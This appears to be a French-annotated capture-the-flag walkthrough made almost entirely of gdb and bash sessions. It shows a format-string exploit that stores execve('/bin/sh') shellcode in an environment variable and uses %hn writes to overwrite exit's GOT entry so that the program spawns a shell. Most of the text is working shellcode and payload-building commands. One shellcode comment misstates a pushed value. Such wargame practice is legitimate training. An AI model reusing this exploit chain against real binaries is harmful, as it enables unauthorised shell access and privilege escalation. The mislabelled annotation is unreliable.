# gdb:
	> disas exit
<<< Dump of assembler code for function exit@plt:
<<< 0x08048370 <+0>:	jmp    *0x80497e0
<<< 0x08048376 <+6>:	push   $0x18
<<< 0x0804837b <+11>:	jmp    0x8048330
<<< End of assembler dump.

On va modifier exit pour qu'il jump au shellcode ci-dessous:

# char sc[] = "\x6a\x0b" // push byte +0xb
# "\x58" // pop eax
# "\x99" // cdq
# "\x52" // push edx
# "\x68\x2f\x2f\x73\x68" // push dword 0x68732f2f
# "\x68\x2f\x62\x69\x6e" // push dword 0x6e69922f
# "\x89\xe3" // mov ebx, esp
# "\x31\xc9" // xor ecx, ecx
# "\xcd\x80"; // int 0x80

# bash:
	> export PAYLOAD05=$(python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")

# gdb:
	> b main
	> r
	> x/s *((char **)environ+16)
<<< 0xffffdf34:	 "PAYLOAD05=j\vX\231Rh//shh/bin\211\343\061\311̀"
	> x/s 0xffffdf3e
<<< 0xffffdf3e:	 "j\vX\231Rh//shh/bin\211\343\061\311̀"

Notre payload a l'adresse 0xffffdf3e

0xffffdf3e
0xffffdf3e - 8 = 0xFFFFDF36

# bash:
	b *0x0804850c
	r < <(cat /tmp/payload05)
	x/24bx 0xffffd678

	python -c 'print "\xff\xff\xd6\x78"[::-1] + "\xff\xff\xd6\x7a"[::-1] + "%57142c" + "%10$hn" + "%8385c" + "%11$hn"' > /tmp/payload05

	python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%57142c" + "%10$hn" + "%8385c" + "%11$hn"' > /tmp/payload05

	x/24bx 0x08048370
0x8048370 <exit@plt>:	0xff 0x25 0xe0 0x97 0x04 0x08 0x68 0x18
0x8048378 <exit@plt+8>: 0x00 0x00 0x00 0xe9 0xb0 0xff 0xff 0xff